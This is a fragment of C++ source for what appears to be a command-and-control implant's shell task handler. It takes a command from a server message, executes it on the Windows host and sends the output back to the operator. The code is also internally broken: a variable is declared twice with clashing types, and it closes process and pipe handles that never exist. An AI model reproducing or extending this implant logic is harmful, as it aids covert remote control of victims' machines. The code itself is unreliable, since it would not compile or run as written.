#include "Shell.h"
#include <windows.h>
#include <string>
#include <iostream>
#include <cstdio>
#include <cstring>
#include "command.h"

BOOL executeShell(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);
    UINT32 nbArg = getInt32(arguments);
    SIZE_T size = 0;
    PCHAR cmd = getString(arguments, &size);

    cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);


    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    PPackage output = newPackage(0, FALSE);

    std::string output;
    BOOL success = executeCommand(cmd, "", &output);

    addBytes(responseTask, (PBYTE)output->buffer, output->length, TRUE);

    // Clean up
    CloseHandle(hStdOutRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Parser *ResponseParser = sendPackage(responseTask);

    return TRUE;
}
